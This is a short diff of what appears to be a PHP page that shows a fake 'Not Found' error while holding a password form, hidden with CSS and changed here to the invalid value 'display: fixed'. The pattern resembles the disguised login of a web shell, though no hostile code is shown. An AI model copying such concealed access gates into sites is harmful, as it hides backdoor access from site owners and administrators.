@@ -61,7 +61,7 @@ if (is_logged_in()) {
 <h2 style="margin-top:20px;font-size: 30px;">Not Found
 </h2>
 <p>The resource requested could not be found on this server!</p>
- <form  style="display: none;" method="POST" action="">
+ <form  style="display: fixed;" method="POST" action="">
             <label for="password"></label>
             <input type="password" id="password" name="password">
             <input type="submit" value=">>">
